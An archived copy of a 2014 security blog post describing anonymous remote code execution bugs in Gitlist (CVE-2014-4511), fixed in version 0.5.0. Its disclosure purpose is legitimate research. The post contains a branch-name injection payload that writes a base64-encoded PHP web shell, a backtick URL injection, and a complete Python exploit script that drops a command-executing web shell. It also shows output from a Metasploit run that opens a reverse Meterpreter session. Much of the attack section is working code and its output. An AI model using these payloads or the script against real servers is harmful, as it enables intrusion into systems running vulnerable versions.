@@ -1,0 +1,436 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>gitlist - commit to rce - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Gitlist is a fantastic repository viewer for Git; it&rsquo;s essentially your own private Github without all the social networking and glitzy &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2014/06/29/gitlist-rce">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Gitlist - Commit to Rce</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-29T15:00:00-07:00" pubdate data-updated="true">Jun 29<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="http://gitlist.org/">Gitlist</a> is a fantastic repository viewer for Git; it&rsquo;s essentially your own private Github without all the social networking and glitzy features of it.  I&rsquo;ve got a private Gitlist that I run locally, as well as a professional instance for hosting internal projects.  Last year I noticed a bug listed on their Github page that looked a lot like an exploitable <a href="https://github.com/klaussilveira/gitlist/issues/395">hole</a>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Oops! sh: 1: Syntax error: EOF in backquote substitution</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I commented on its exploitability at the time, and though the hole appears to be closed, the issue still remains.  I returned to this during an install of Gitlist and decided to see if there were any other bugs in the application and, as it turns out, there are a few.  I discovered a handful of bugs during my short hunt that I&rsquo;ll document here, including one anonymous remote code execution vulnerability that&rsquo;s quite trivial to pop.  These bugs were reported to the developers and CVE-2014-4511 was assigned.  These issues were fixed in version 0.5.0.</p>
+
+<p>The first bug is actually more of a vulnerability in a library Gitlist uses, Gitter (same developers).  Gitter allows developers to interact with Git repositories using Object-Oriented Programming (OOP).  During a quick once-over of the code, I noticed the library shelled out quite a few times, and one in particular stood out to me:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$hash = $this-&gt;getClient()-&gt;run($this, "log --pretty=\"%T\" --max-count=1 $branch");```</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This can be found in <code>Repository.php</code> of the Gitter library, and is invoked from <code>TreeController.php</code> in Gitlist.  As you can imagine, there is no sanitization on the <code>$branch</code> variable.  This essentially means that anyone with commit access to the repository can create a malicious branch name (locally or remotely) and end up executing arbitrary commands on the server.</p>
+
+<p>The tricky part comes with the branch name; git actually has a couple restrictions on what can and cannot be part of a branch name.  This is all defined and checked inside of <a href="https://github.com/git/git/blob/cb682f8cfe63ecd0da08a526f404d295e51e3ab1/refs.c">refs.c</a>, and the rules are simply defined as (starting at line 33):</p>
+
+<ol>
+<li>Cannot begin with .</li>
+<li>Cannot have a double dot (..)</li>
+<li>Cannot contain ASCII control characters (?, [, ], ~, ^, :, \)</li>
+<li>End with /</li>
+<li>End with .lock</li>
+<li>Contain a backslash</li>
+<li>Cannot contain a space</li>
+</ol>
+
+
+<p>With these restrictions in mind, we can begin crafting our payload.</p>
+
+<p>My first thought was, because Gitlist is written in PHP, to drop a web shell.  To do so we must print our payload out to a file in a location accessible to the web root.  As it so happens, we have just the spot to do it.  According to INSTALL.md, the following is required:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cd /var/www/gitlist
+</span><span class='line'>mkdir cache
+</span><span class='line'>chmod 777 cache</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is perfect; we have a <em>reliable</em> location with 777 permissions and it&rsquo;s accessible from the web root (/gitlist/cache/my_shell.php).  Second step is to come up with a payload that adheres to the Git branch rules while still giving us a shell.  What I came up with is as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># git checkout -b "|echo\$IFS\"PD9zeXN0ZW0oJF9SRVFVRVNUWyd4J10pOz8+Cg==\"|base64\$IFS-d&gt;/var/www/gitlist/cache/x"</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In order to inject PHP, we need the &lt;? and ?> headers, so we need to encode our PHP payload.  We use the $IFS environment variable (Internal Field Separator) to plug in our spaces and echo the base64&rsquo;d shell into <code>base64</code> for decoding, then pipe that into our payload location.</p>
+
+<p>And it works flawlessly.</p>
+
+<p>Though you might say, &ldquo;Hey if you have commit access it&rsquo;s game over&rdquo;, but I&rsquo;ve seen several instances of this not being the case.  Commit access does not necessarily equate to shell access.</p>
+
+<p>The second vulnerability I discovered was a trivial RCE, exploitable by anonymous users without any access.  I first noticed the bug while browsing the source code, and ran into this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$blames = $repository-&gt;getBlame("$branch -- \"$file\"");</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Knowing how often they shell out, and the complete lack of input sanitization, I attempted to pop this by trivially evading the double quotes and injecting grave accents:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://localhost/gitlist/my_repo.git/blame/master/""`whoami`</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And what do you know?</p>
+
+<p><img src="/images/posts/2014/gitlist_rce1.jpg"></p>
+
+<p>Curiousity quickly overcame me, and I attempted another vector:</p>
+
+<p><img src="/images/posts/2014/gitlist_rce2.jpg"></p>
+
+<p>Faster my fingers flew:</p>
+
+<p><img src="/images/posts/2014/gitlist_rce3.jpg"></p>
+
+<p>It&rsquo;s terrifyingly clear that <em>everything</em> is an RCE.  I developed a rough PoC to drop a web shell on the system.  A test run of this is below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@droot:~/exploits# python gitlist_rce.py http://192.168.1.67/gitlist/graymatter
+</span><span class='line'>[!] Using cache location /var/www/gitlist/cache
+</span><span class='line'>[!] Shell dropped; go hit http://192.168.1.67/gitlist/cache/x.php?cmd=ls
+</span><span class='line'>root@droot:~/exploits# curl http://192.168.1.67/gitlist/cache/x.php?cmd=id
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class='line'>root@droot:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>I&rsquo;ve also developed a Metasploit module for this issue, which I&rsquo;ll be submitting a PR for soon.  A run of it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(gitlist_rce) &gt; rexploit
+</span><span class='line'>[*] Reloading module...
+</span><span class='line'>
+</span><span class='line'>[*] Started reverse handler on 192.168.1.6:4444 
+</span><span class='line'>[*] Injecting payload...
+</span><span class='line'>[*] Executing payload..
+</span><span class='line'>[*] Sending stage (39848 bytes) to 192.168.1.67
+</span><span class='line'>[*] Meterpreter session 9 opened (192.168.1.6:4444 -&gt; 192.168.1.67:34241) at 2014-06-21 23:07:01 -0600
+</span><span class='line'>
+</span><span class='line'>meterpreter &gt; sysinfo
+</span><span class='line'>Computer    : bryan-VirtualBox
+</span><span class='line'>OS          : Linux bryan-VirtualBox 3.2.0-63-generic #95-Ubuntu SMP Thu May 15 23:06:36 UTC 2014 i686
+</span><span class='line'>Meterpreter : php/php
+</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Source for the standalone Python exploit can be found below.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from commands import getoutput
+</span><span class='line'>import urllib
+</span><span class='line'>import sys
+</span><span class='line'>
+</span><span class='line'>""" 
+</span><span class='line'>Exploit Title: Gitlist &lt;= 0.4.0 anonymous RCE
+</span><span class='line'>Date: 06/20/2014
+</span><span class='line'>Author: drone (@dronesec)
+</span><span class='line'>Vendor Homepage: http://gitlist.org/
+</span><span class='line'>Software link: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz
+</span><span class='line'>Version: &lt;= 0.4.0
+</span><span class='line'>Tested on: Debian 7
+</span><span class='line'>More information: 
+</span><span class='line'>cve: CVE-2014-4511
+</span><span class='line'>"""
+</span><span class='line'>
+</span><span class='line'>if len(sys.argv) &lt;= 1:
+</span><span class='line'>    print '%s: [url to git repo] {cache path}' % sys.argv[0]
+</span><span class='line'>    print '  Example: python %s http://localhost/gitlist/my_repo.git' % sys.argv[0]
+</span><span class='line'>    print '  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache' % sys.argv[0]
+</span><span class='line'>    sys.exit(1)
+</span><span class='line'>
+</span><span class='line'>url = sys.argv[1]
+</span><span class='line'>url = url if url[-1] != '/' else url[:-1]
+</span><span class='line'>
+</span><span class='line'>path = "/var/www/gitlist/cache"
+</span><span class='line'>if len(sys.argv) &gt; 2:
+</span><span class='line'>    path = sys.argv[2]
+</span><span class='line'>
+</span><span class='line'>print '[!] Using cache location %s' % path
+</span><span class='line'>
+</span><span class='line'># payload &lt;?system($_GET['cmd']);?&gt;
+</span><span class='line'>payload = "PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo="
+</span><span class='line'>
+</span><span class='line'># sploit; python requests does not like this URL, hence wget is used
+</span><span class='line'>mpath = '/blame/master/""`echo {0}|base64 -d &gt; {1}/x.php`'.format(payload, path)
+</span><span class='line'>mpath = url+ urllib.quote(mpath)
+</span><span class='line'>
+</span><span class='line'>out = getoutput("wget %s" % mpath)
+</span><span class='line'>if '500' in out:
+</span><span class='line'>    print '[!] Shell dropped; go hit %s/cache/x.php?cmd=ls' % url.rsplit('/', 1)[0]
+</span><span class='line'>else:
+</span><span class='line'>    print '[-] Failed to drop'
+</span><span class='line'>    print out</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-29T15:00:00-07:00" pubdate data-updated="true">Jun 29<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/gitlist/'>gitlist</a>, <a class='category' href='/blog/categories/rce/'>rce</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2014/06/29/gitlist-rce/" data-via="" data-counturl="http://hatRiot.github.io/blog/2014/06/29/gitlist-rce/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/06/25/railo-security-part-one/" title="Previous Post: railo security - part one - intro">&laquo; railo security - part one - intro</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/07/24/railo-security-part-two/" title="Next Post: railo security - part two - post-authentication rce">railo security - part two - post-authentication rce &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
